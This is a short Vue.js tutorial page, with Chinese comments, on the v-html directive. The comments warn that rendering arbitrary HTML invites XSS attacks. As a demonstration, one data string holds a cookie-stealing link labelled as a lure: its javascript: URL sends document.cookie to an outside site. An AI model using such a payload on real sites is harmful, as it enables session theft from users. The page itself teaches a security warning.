<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script src="../vue.js"></script>
</head>
<body>
    <!-- 
        v-html指令:
            1.作用：向指定节点中渲染包含html结构的内容
            2.与插值语法的区别:
                (1).v-html会替换掉节点中所有的内容,{{xx}}不会
                (2).v-html可以识别html结构
            3.严重注意:v-html存在安全问题!
                (1).在网站上动态渲染任意html是非常危险的,容易导致xss攻击
                (2).一定要在可信的内容上使用v-html,永远不要用在用户提交的内容上！
     -->
    <div class="main">
        <div>{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str1"></div>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el:'.main',
        data:{
            name:"尚硅谷",
            str:'<h2>你好啊!</h3>',
            str1:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>火速来看</a>'
        }
    })
</script>
</html>
